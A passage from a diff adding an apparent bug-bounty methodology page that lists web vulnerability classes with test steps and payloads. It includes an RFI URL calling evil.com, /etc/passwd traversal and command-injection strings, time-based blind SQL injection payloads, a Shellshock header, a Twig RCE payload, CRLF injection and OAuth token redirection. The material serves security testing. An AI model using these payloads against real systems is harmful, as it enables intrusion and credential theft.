+&lt;li>&lt;code>dest&lt;/code>, &lt;code>redirect&lt;/code>, &lt;code>uri&lt;/code>, &lt;code>path&lt;/code>, &lt;code>continue&lt;/code>, &lt;code>url&lt;/code>, &lt;code>window&lt;/code>, &lt;code>to&lt;/code>, &lt;code>out&lt;/code>, &lt;code>view&lt;/code>, &lt;code>dir&lt;/code>, &lt;code>show&lt;/code>, &lt;code>navigation&lt;/code>, &lt;code>open&lt;/code>, &lt;code>u&lt;/code>, &lt;code>file&lt;/code>, &lt;code>val&lt;/code>, &lt;code>validate&lt;/code>, &lt;code>domain&lt;/code>, &lt;code>callback&lt;/code>, &lt;code>return&lt;/code>, &lt;code>page&lt;/code>, &lt;code>feed&lt;/code>, &lt;code>host&lt;/code>, &lt;code>port&lt;/code>, &lt;code>next&lt;/code>, &lt;code>data&lt;/code>, &lt;code>reference&lt;/code>, &lt;code>site&lt;/code>, &lt;code>html&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Test URLs:
+&lt;ul>
+&lt;li>&lt;code>site.com/bing.com&lt;/code>, &lt;code>site.com//bing.com&lt;/code>, &lt;code>site.com/payloads&lt;/code>****&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h3 id="9-parameter-tampering">9. Parameter Tampering
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong> Apply to ecommerce websites&lt;/p>
+&lt;hr>
+&lt;h3 id="10-html-injection">10. HTML Injection
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Use GET or POST method&lt;/li>
+&lt;li>Input value reflecting back&lt;/li>
+&lt;li>Test with HTML payload like &lt;code>&amp;lt;h1&amp;gt;adam&amp;lt;/h1&amp;gt;&lt;/code>&lt;/li>
+&lt;li>URL redirection via HTML injection****&lt;/li>
+&lt;/ol>
+&lt;h3 id="11-file-inclusion">11. File Inclusion
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Local File Inclusion (LFI) &amp;amp; Remote File Inclusion (RFI)&lt;/li>
+&lt;li>For LFI, try:
+&lt;ul>
+&lt;li>&lt;code>any.com/index.php?reference=login.php&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>For RFI, try:
+&lt;ul>
+&lt;li>&lt;code>any.com/?share=http://evil.com/&lt;/code>&lt;/li>
+&lt;li>Common parameters to look for:
+&lt;ul>
+&lt;li>&lt;code>file&lt;/code>, &lt;code>document&lt;/code>, &lt;code>folder&lt;/code>, &lt;code>root&lt;/code>, &lt;code>path&lt;/code>, &lt;code>pg&lt;/code>, &lt;code>style&lt;/code>, &lt;code>pdf&lt;/code>, &lt;code>template&lt;/code>, &lt;code>php_path&lt;/code>, &lt;code>doc&lt;/code>, &lt;code>dest&lt;/code>, &lt;code>redirect&lt;/code>, &lt;code>uri&lt;/code>, &lt;code>path&lt;/code>, &lt;code>continue&lt;/code>, &lt;code>url&lt;/code>, &lt;code>window&lt;/code>, &lt;code>next&lt;/code>, &lt;code>data&lt;/code>, &lt;code>reference&lt;/code>, &lt;code>site&lt;/code>, &lt;code>html&lt;/code>, &lt;code>val&lt;/code>, &lt;code>validate&lt;/code>, &lt;code>domain&lt;/code>, &lt;code>callback&lt;/code>, &lt;code>return&lt;/code>, &lt;code>page&lt;/code>, &lt;code>feed&lt;/code>, &lt;code>port&lt;/code>, &lt;code>host&lt;/code>, &lt;code>to&lt;/code>, &lt;code>out&lt;/code>, &lt;code>view&lt;/code>, &lt;code>dir&lt;/code>, &lt;code>show&lt;/code>, &lt;code>navigation&lt;/code>, &lt;code>open&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>For LFI, check:
+&lt;ul>
+&lt;li>&lt;code>/var/www/html/&lt;/code> &amp;amp; &lt;code>/etc/passwd&lt;/code>&lt;/li>
+&lt;li>&lt;code>../../etc/passwd&lt;/code>&lt;strong>Tool Used:&lt;/strong> Lfisuite tool from GitHub&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h3 id="12-missing-spf-dmarc-records">12. Missing SPF, DMARC Records
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Detect missing SPF and DMARC records using:
+&lt;ul>
+&lt;li>&lt;code>mxtoolbox.com&lt;/code>&lt;/li>
+&lt;li>&lt;code>anonymousmail.me&lt;/code>&lt;/li>
+&lt;li>&lt;code>https://emkei.cz/&lt;/code>&lt;strong>Tool Used:&lt;/strong> &lt;a class="link" href="http://mxtoolbox.com/" target="_blank" rel="noopener"
+>mxtoolbox.com&lt;/a> / &lt;a class="link" href="http://anonymousmail.me/" target="_blank" rel="noopener"
+>anonymousmail.me&lt;/a> / &lt;a class="link" href="https://emkei.cz/" target="_blank" rel="noopener"
+>https://emkei.cz/&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="13-ssrf-server-side-request-forgery">13. SSRF (Server-Side Request Forgery)
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Make a request from a vulnerable application to a target website.&lt;/li>
+&lt;li>Common parameters to look for:
+&lt;ul>
+&lt;li>&lt;code>dest&lt;/code>, &lt;code>redirect&lt;/code>, &lt;code>uri&lt;/code>, &lt;code>path&lt;/code>, &lt;code>continue&lt;/code>, &lt;code>url&lt;/code>, &lt;code>window&lt;/code>, &lt;code>next&lt;/code>, &lt;code>data&lt;/code>, &lt;code>reference&lt;/code>, &lt;code>site&lt;/code>, &lt;code>html&lt;/code>, &lt;code>val&lt;/code>, &lt;code>validate&lt;/code>, &lt;code>domain&lt;/code>, &lt;code>callback&lt;/code>, &lt;code>return&lt;/code>, &lt;code>page&lt;/code>, &lt;code>view&lt;/code>, &lt;code>dir&lt;/code>, &lt;code>show&lt;/code>, &lt;code>file&lt;/code>, &lt;code>document&lt;/code>, &lt;code>folder&lt;/code>, &lt;code>root&lt;/code>, &lt;code>path&lt;/code>, &lt;code>pg&lt;/code>, &lt;code>style&lt;/code>, &lt;code>pdf&lt;/code>, &lt;code>template&lt;/code>, &lt;code>php_path&lt;/code>, &lt;code>doc&lt;/code>, &lt;code>feed&lt;/code>, &lt;code>host&lt;/code>, &lt;code>port&lt;/code>, &lt;code>to&lt;/code>, &lt;code>out&lt;/code>, &lt;code>navigation&lt;/code>, &lt;code>open&lt;/code>, &lt;code>result&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Detection using:
+&lt;ul>
+&lt;li>&lt;code>https://www.expressvpn.com/what-is-my-ip&lt;/code>&lt;/li>
+&lt;li>Burp Collaborator&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>For exploitation, try:
+&lt;ul>
+&lt;li>&lt;code>any.com/index/php?uri=http://external.com&lt;/code>&lt;/li>
+&lt;li>Read file from server (e.g., &lt;code>file:///identf&lt;/code> using LFI payloads)&lt;/li>
+&lt;li>Scan internal network (e.g., &lt;code>http://localhost:1&lt;/code> changing the port number to common ports like 21, 22)&lt;/li>
+&lt;li>SSRF with RFI: Execute code from the external domain (e.g., use &lt;code>hackoff.html&lt;/code> with XSS script)&lt;strong>Tool Used:&lt;/strong> Burp Collaborator / &lt;code>https://www.expressvpn.com/what-is-my-ip&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h3 id="14-critical-file-found--source-code-disclosure">14. Critical File Found &amp;amp; Source Code Disclosure
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Use payloads from:
+&lt;ul>
+&lt;li>&lt;code>https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Utilize &lt;code>dirsearch&lt;/code>****&lt;/li>
+&lt;/ol>
+&lt;h3 id="15-subdomain-takeover">15. Subdomain Takeover
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>If the website is not in use by the target and is hosted on a service provider:
+&lt;ul>
+&lt;li>Sign up on service providers like GitHub, Heroku, Shopify, Zendesk, AWS, Tumblr, etc., to attempt domain takeover&lt;strong>Tool Used:&lt;/strong> &lt;code>github.com/nahamsec/HostileSubBruteforcer&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="16-command-injection">16. Command Injection
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Take input as a command and reflect the output of that command.&lt;/li>
+&lt;li>Common parameters to look for:
+&lt;ul>
+&lt;li>&lt;code>daemon&lt;/code>, &lt;code>host&lt;/code>, &lt;code>upload&lt;/code>, &lt;code>dir&lt;/code>, &lt;code>execute&lt;/code>, &lt;code>download&lt;/code>, &lt;code>log&lt;/code>, &lt;code>ip&lt;/code>, &lt;code>cli&lt;/code>, &lt;code>cmd&lt;/code>, &lt;code>filename&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Find command injection using delimiter list (e.g., &lt;code>;&lt;/code>, &lt;code>^&lt;/code>, &lt;code>&amp;amp;&lt;/code>, &lt;code>&amp;amp;&amp;amp;&lt;/code>, &lt;code>|&lt;/code>, &lt;code>||&lt;/code>, &lt;code>%0D&lt;/code>, &lt;code>%0A&lt;/code>, &lt;code>\\n&lt;/code>, &lt;code>&amp;lt;&lt;/code>)&lt;/li>
+&lt;li>Identify input fields interacting with the OS shell.&lt;/li>
+&lt;li>Try with delimiter &amp;amp; shell commands (e.g., &lt;code>;dir&lt;/code>, &lt;code>;/etc/passwd&lt;/code>)&lt;/li>
+&lt;li>Intercept requests using Clusterbomb - first parameter for delimiter &amp;amp; second for command payloads&lt;strong>Tool Used:&lt;/strong> &lt;code>github.com/commixproject/commix.git&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;h3 id="17-file-upload-vulnerability">17. File Upload Vulnerability
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Simple file upload (e.g., &lt;code>shell.php&lt;/code>) for full control of the server and running shell commands.&lt;/li>
+&lt;li>Use payloads from:
+&lt;ul>
+&lt;li>&lt;code>github.com/fuzzdb-projects/fuzzdb/tree/master/attack/file-upload/malicious-images&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Pixel flood attack.&lt;/li>
+&lt;li>Verify content type.&lt;/li>
+&lt;li>Check extension verification.&lt;strong>Tool Used:&lt;/strong> &lt;code>github.com/almandin/fuxploider&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;h3 id="18-xxe-injection-xml-external-entity-injection">18. XXE Injection (XML External Entity Injection)
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Use XXE payloads in Intruder to detect.&lt;/li>
+&lt;li>Check if the website is accepting &lt;code>content-type=text/xml&lt;/code> header with a &lt;code>200 OK&lt;/code> response.&lt;/li>
+&lt;li>Use online tool &lt;code>pingb.in&lt;/code> to check for external ping.&lt;/li>
+&lt;li>For blind XXE, use Python’s SimpleHTTPServer (e.g., &lt;code>python -m SimpleHTTPServer 80&lt;/code>).&lt;/li>
+&lt;li>SYSTEM &lt;code>file:///etc/passwd&lt;/code> for local file read.&lt;/li>
+&lt;li>SYSTEM &lt;code>http://systemip/readinganyfile&lt;/code> for blind XXE.&lt;/li>
+&lt;li>Use &lt;code>php://&lt;/code> for Remote Code Execution (RCE).&lt;/li>
+&lt;li>Use Gopher or other URI handlers to exploit XXE.&lt;strong>Common Places to Find XXE:&lt;/strong>&lt;/li>
+&lt;/ol>
+&lt;ul>
+&lt;li>XML file upload (e.g., config files)&lt;/li>
+&lt;li>XML input fields&lt;/li>
+&lt;li>XML-based APIs&lt;/li>
+&lt;li>XML-based files (e.g., RSS, SVG)&lt;strong>Tool Used:&lt;/strong> &lt;code>pingb.in&lt;/code> / Burp Suite&lt;/li>
+&lt;/ul>
+&lt;h3 id="19-account-lockout">19. Account Lockout
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Prevent brute-force attacks.&lt;/li>
+&lt;li>Intercept the login page with user credentials using Burp Suite.&lt;/li>
+&lt;li>Send the request to Sequencer.&lt;/li>
+&lt;li>Alternatively, use Intruder to make multiple requests (e.g., 1000 times).&lt;/li>
+&lt;li>Perform credential stuffing.&lt;/li>
+&lt;li>Ensure the account locks out for 30 minutes to 24 hours.****&lt;/li>
+&lt;/ol>
+&lt;h3 id="20-blind-xss">20. Blind XSS
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>A type of stored XSS where attacker input is saved in the server and stored in the database.&lt;/li>
+&lt;li>It won’t be reflected immediately.&lt;/li>
+&lt;li>Look for blind XSS in pages like:
+&lt;ul>
+&lt;li>Contact us&lt;/li>
+&lt;li>Log viewers&lt;/li>
+&lt;li>Feedback pages&lt;/li>
+&lt;li>Chat apps&lt;/li>
+&lt;li>Ticket generation apps&lt;/li>
+&lt;li>Any app using moderation or updates&lt;/li>
+&lt;li>Saving forms&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Use the online tool &lt;code>xsshunter.com&lt;/code>.&lt;/li>
+&lt;li>Copy the payload and paste it in the input field.&lt;/li>
+&lt;li>Reflection will be found on &lt;code>xsshunter.com&lt;/code>.&lt;/li>
+&lt;li>Perform multiple blind XSS using Intruder.**** / &lt;a class="link" href="http://xsshunter.com/" target="_blank" rel="noopener"
+>XSSHunter.com&lt;/a>&lt;/li>
+&lt;/ol>
+&lt;h3 id="21-buffer-overflow-web">21. Buffer Overflow (Web)
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Intercept the login page and pass a long string of passwords or other inputs. Observe if the page loads slowly.&lt;/li>
+&lt;li>Types of overflows to consider: Buffer, Stack, Heap, Integer, Format String.&lt;/li>
+&lt;li>Denial of Service (DoS) attacks using buffer overflow can be attempted.****&lt;/li>
+&lt;/ol>
+&lt;h3 id="22-cms-vulnerability-hunting">22. CMS Vulnerability Hunting
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Target common CMS platforms: WordPress, Joomla, Drupal, vBulletin, Magento.&lt;/li>
+&lt;li>Identify vulnerable components within the CMS.&lt;/li>
+&lt;li>Search for exploits using Google.&lt;strong>Tools Used:&lt;/strong> WPScan, CMSMap, CMSSCAN, Joomscan, Drupwn, vBulletin Scanner, Mage Scanner, OWASP VBScan&lt;/li>
+&lt;/ol>
+&lt;h3 id="23-idor-insecure-direct-object-references">23. IDOR (Insecure Direct Object References)
+&lt;/h3>&lt;p>&lt;strong>Scenario 1:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Often found in user settings or profile management.&lt;/li>
+&lt;li>Requires two accounts.&lt;/li>
+&lt;li>Intercept the request and change the email ID of the attacker.&lt;/li>
+&lt;li>Log out and attempt to log in with the victim&amp;rsquo;s account to see if the change was successful.&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Scenario 2: User Moderation:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Find the user ID.&lt;/li>
+&lt;li>Replace the victim’s ID with the attacker’s ID.&lt;/li>
+&lt;li>Perform the functionality to see if access is granted.****&lt;/li>
+&lt;/ol>
+&lt;h3 id="24-long-password-dos-attack">24. Long Password DoS Attack
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Hashing passwords can be resource-intensive, leading to potential DoS.&lt;/li>
+&lt;li>Similar to buffer overflow attacks but specifically targeting password fields without length limits.&lt;/li>
+&lt;li>Sign up for an account and intercept the request.&lt;/li>
+&lt;li>Input a password longer than the typical length and forward the request.&lt;/li>
+&lt;li>This can cause application DoS.****&lt;/li>
+&lt;/ol>
+&lt;h3 id="25-no-rate-limiting-vulnerability-logical-flow">25. No Rate Limiting Vulnerability (Logical Flow)
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Capture the forgot password page or any similar request with Burp Suite.&lt;/li>
+&lt;li>Send the request to Intruder.&lt;/li>
+&lt;li>Make multiple requests (e.g., 1000 times) to test for rate limiting issues.&lt;/li>
+&lt;li>This can impact both user and server performance.****&lt;/li>
+&lt;/ol>
+&lt;h3 id="26-password-reset-poisoning">26. Password Reset Poisoning
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Intercept the forgot password page with Burp Suite.&lt;/li>
+&lt;li>Perform a host header attack.&lt;/li>
+&lt;li>The victim will receive a password reset email from an &amp;ldquo;evil&amp;rdquo; website specified in the host header.****&lt;/li>
+&lt;/ol>
+&lt;h3 id="27-broken-access-control">27. Broken Access Control
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>&lt;strong>IDOR Example:&lt;/strong>
+&lt;ul>
+&lt;li>Access with account 1: &lt;code>https://acme.com/changepw/id?=1234&lt;/code>&lt;/li>
+&lt;li>Create a second account and access it: &lt;code>https://acme.com/changepw/id?=5678&lt;/code>&lt;/li>
+&lt;li>Logout from account 1, log into account 2, and attempt to change the password of account 1 by modifying the user ID in the request.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Hash-Based IDOR:&lt;/strong>
+&lt;ul>
+&lt;li>User IDs might be hashed (e.g., Base64).&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Local File Inclusion (LFI) &amp;amp; Path Traversal:&lt;/strong>
+&lt;ul>
+&lt;li>Example request: &lt;code>GET /view?pg=../../../../../etc/passwd%00&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Common Parameters to Look For:&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>id&lt;/code>, &lt;code>user&lt;/code>, &lt;code>account&lt;/code>, &lt;code>number&lt;/code>, &lt;code>order&lt;/code>, &lt;code>no&lt;/code>, &lt;code>doc&lt;/code>, &lt;code>key&lt;/code>, &lt;code>email&lt;/code>, &lt;code>group&lt;/code>, &lt;code>profile&lt;/code>, &lt;code>edit&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Functions to Test:&lt;/strong>
+&lt;ul>
+&lt;li>Change email, change password, upgrade/downgrade user role, create/remove/update/delete context-specific app data (e.g., shipping, invoices, document viewing).&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Missing Function Level Access Control:&lt;/strong>
+&lt;ul>
+&lt;li>Forceful browsing (e.g., &lt;code>GET /admin/viewTransactions&lt;/code>, &lt;code>GET /ADMIN/viewTransactions&lt;/code>)&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Parameter Manipulation &amp;amp; Logic Bugs:&lt;/strong>
+&lt;ul>
+&lt;li>Example: Giving a negative price.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Logic Flow Vulnerabilities in E-commerce:&lt;/strong>
+&lt;ul>
+&lt;li>Skipping steps in workflows (e.g., &lt;code>additem-&amp;gt;checkout-&amp;gt;enter shipping info-&amp;gt;payment&lt;/code>).&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Tools Used:&lt;/strong> Burp Suite Extensions (AuthMatrix, AuthZ, Authorize, AutoRepeater)&lt;/p>
+&lt;h3 id="28-account-takeover-via-forgot-password-page">28. Account Takeover via Forgot Password Page
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Intercept the forgot password page with Burp Suite.&lt;/li>
+&lt;li>Add &lt;code>X-Forwarded-Host: bing.com&lt;/code> to the request header.&lt;/li>
+&lt;li>Forward the request to test for account takeover vulnerabilities.****&lt;/li>
+&lt;/ol>
+&lt;h3 id="29-broken-access-control">29. Broken Access Control
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Create an account.&lt;/li>
+&lt;li>Change the email ID from A to B.&lt;/li>
+&lt;li>Generate a forgot password request for email A.&lt;/li>
+&lt;li>Repeat the same process for passwords.****&lt;/li>
+&lt;/ol>
+&lt;h3 id="30-rate-limiting-bypass">30. Rate Limiting Bypass
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Intercept the forgot password page with Burp Suite.&lt;/li>
+&lt;li>Send the request to Intruder.&lt;/li>
+&lt;li>Add &lt;code>X-Forwarded-Host: bing.com&lt;/code> to the request header.&lt;/li>
+&lt;li>Target the request to email and forward it to test for rate limiting bypass.****&lt;/li>
+&lt;/ol>
+&lt;h3 id="31-lack-of-password-confirmation">31. Lack of Password Confirmation
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Required for actions such as deleting an account or changing an email ID.&lt;/li>
+&lt;li>Verify that a password confirmation step is missing in these processes.****&lt;/li>
+&lt;/ol>
+&lt;h3 id="32-2fa-or-otp-bypass">32. 2FA or OTP Bypass
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Complete the registration process and request an OTP code.&lt;/li>
+&lt;li>Intercept the OTP request using Burp Suite.&lt;/li>
+&lt;li>Send the intercepted request to Intruder.&lt;/li>
+&lt;li>Bruteforce the 6-digit OTP through Burp Intruder if there’s no rate limiting or CAPTCHA.&lt;/li>
+&lt;li>Analyze content length and attempt multiple combinations until bypassing OTP verification.****&lt;/li>
+&lt;/ol>
+&lt;h3 id="33-blind-sql-injection">33. Blind SQL Injection
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Check input fields and insert payloads such as &lt;code>id=1&lt;/code>.&lt;/li>
+&lt;li>Insert payloads in user-agent or other input parameters.&lt;/li>
+&lt;li>Confirm by changing the time interval with payloads like:
+&lt;ul>
+&lt;li>&lt;code>id=5+and+1=2&lt;/code>&lt;/li>
+&lt;li>&lt;code>',0)waitfor delay'0:0:05'--&lt;/code>&lt;/li>
+&lt;li>&lt;code>if(now()=sysdate(),sleep(5),0)) --&lt;/code>&lt;/li>
+&lt;li>&lt;code>(select(0)from(select(sleep(3)))v)/*'+(select(3)from(select(sleep(3)))v)+'&amp;quot;&amp;quot;+(select(0)from(select(sleep(3)))v)+&amp;quot;&amp;quot;*/&lt;/code>&lt;/li>
+&lt;li>&lt;code>0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z&lt;/code>&lt;/li>
+&lt;li>&lt;code>' and extractvalue(1,concat(0x0a,@@version)) or&lt;/code>**** or Cookie Manager&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h3 id="34-remote-code-execution-vulnerability">34. Remote Code Execution Vulnerability
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Visit the target website and create an account.&lt;/li>
+&lt;li>Verify the email address and navigate to profile settings.&lt;/li>
+&lt;li>Upload a malicious file (e.g., &lt;code>RCE.php%00.gif&lt;/code>) as the company logo and save.&lt;/li>
+&lt;li>View the uploaded image URL and append &lt;code>?cmd=id&lt;/code> to execute the &lt;code>id&lt;/code> command.&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Scenario 2:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Crawl the target website using Burp Suite.&lt;/li>
+&lt;li>Check for &lt;code>/cgi-bin/status&lt;/code>.&lt;/li>
+&lt;li>Send to Repeater and replace &lt;code>User-Agent&lt;/code> with payload like &lt;code>{:;};echo $(&amp;lt;/etc/passwd)&lt;/code>.&lt;/li>
+&lt;li>Send the request to see if it reveals root user info.**** or Manual&lt;/li>
+&lt;/ol>
+&lt;h3 id="35-stealing-oauth-token">35. Stealing OAuth Token
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Log in using a third-party app (e.g., Facebook, Gmail).&lt;/li>
+&lt;li>Intercept the request using Burp Suite.&lt;/li>
+&lt;li>Modify &lt;code>redirect_url&lt;/code> to a domain you control (e.g., &lt;code>bugbountypoc.com&lt;/code>).&lt;/li>
+&lt;li>If necessary, change the &lt;code>referer&lt;/code> header to the same domain.****&lt;/li>
+&lt;/ol>
+&lt;h3 id="36-external-service-interaction">36. External Service Interaction
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Capture the request using Burp Suite.&lt;/li>
+&lt;li>Send the request to Repeater.&lt;/li>
+&lt;li>Replace &lt;code>Host&lt;/code> header with Burp Collaborator payload or add a new &lt;code>X-Forwarded-For&lt;/code> header with the same payload.&lt;/li>
+&lt;li>Forward the request and check if Burp Collaborator receives a DNS lookup request.****&lt;/li>
+&lt;/ol>
+&lt;h3 id="37-server-side-include-ssi-injection">37. Server-Side Include (SSI) Injection
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Intercept the request using Burp Suite.&lt;/li>
+&lt;li>Spider the target host.&lt;/li>
+&lt;li>Search for pages with &lt;code>.shtml&lt;/code> extensions.&lt;/li>
+&lt;li>Inject payloads like &lt;code>&amp;lt;!--#echo var=&amp;quot;DATE_LOCAL&amp;quot; --&amp;gt;&lt;/code> into input fields.&lt;/li>
+&lt;li>Forward the request and check the response for injected data.****&lt;/li>
+&lt;/ol>
+&lt;h3 id="38-client-and-server-side-template-injection">38. Client and Server-Side Template Injection
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Check if user input is reflected on the webpage. Insert payloads to test for template injection.&lt;/li>
+&lt;li>Common Template Engines:
+&lt;ul>
+&lt;li>FreeMarker (Java-based)&lt;/li>
+&lt;li>Velocity (Java-based)&lt;/li>
+&lt;li>Smarty (PHP-based)&lt;/li>
+&lt;li>Twig (PHP-based)&lt;/li>
+&lt;li>Jade (Node.js-based)&lt;/li>
+&lt;li>Jinja2 (Python/Flask-based)&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Manual Checking:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Example Payloads:
+&lt;ul>
+&lt;li>&lt;code>curl -g '&amp;lt;http://www.target.com/page?name=John'&lt;/code>&amp;gt;&lt;/li>
+&lt;li>&lt;code>curl -g '&amp;lt;http://www.target.com/page?name={{7*7}&amp;gt;}'&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Automation Tool:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>&lt;code>https://github.com/epinna/tplmap&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Basic Payloads:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>{{7*7}}&lt;/code>&lt;/li>
+&lt;li>&lt;code>{{7*'7'}}&lt;/code>&lt;/li>
+&lt;li>&lt;code>{% extends &amp;quot;/etc/passwd&amp;quot; %}&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>&lt;strong>RCE Payload (Twig):&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>{{_self.env.registerUndefinedFilterCallback(&amp;quot;exec&amp;quot;)}}{{_self.env.getFilter(&amp;quot;id&amp;quot;)}}&lt;/code>&lt;strong>Tool Used:&lt;/strong> Manual Checking, curl, tplmap&lt;/li>
+&lt;/ul>
+&lt;h3 id="39-exif-geolocation-data-not-stripped">39. Exif GeoLocation Data Not Stripped
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Download an image from &lt;code>https://github.com/ianare/exif-samples&lt;/code>.&lt;/li>
+&lt;li>Go to JPG properties and check GPS data.&lt;/li>
+&lt;li>Upload the image to the target website.&lt;/li>
+&lt;li>Copy the image URL and paste it into an EXIF data tool (e.g., &lt;code>http://metapicz.com/&lt;/code>).&lt;strong>Tool Used:&lt;/strong> &lt;a class="link" href="http://exif.regex.info/exif.cgi" target="_blank" rel="noopener"
+>Exif.regex.info/exif.cgi&lt;/a>&lt;/li>
+&lt;/ol>
+&lt;h3 id="40-crlf-injection">40. CRLF Injection
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Capture a request using Burp Suite.&lt;/li>
+&lt;li>Insert arbitrary data in the input field (e.g., &lt;code>aaaaaaaaaaaaa&lt;/code>).&lt;/li>
+&lt;li>If the input is reflected in the response header, it may be vulnerable.&lt;/li>
+&lt;li>Test Carriage Return (&lt;code>%0A&lt;/code>) and Linefeed (&lt;code>%0D&lt;/code>) payloads.&lt;/li>
+&lt;li>Example Payload:
+&lt;ul>
+&lt;li>&lt;code>%0a%0dxxxxxxxxxxxxx&lt;/code>&lt;/li>
+&lt;li>&lt;code>return_url=aaaa%0a%0dset-cookie:mycookie&lt;/code>****&lt;/li>
+&lt;/ul>
+&lt;/li>
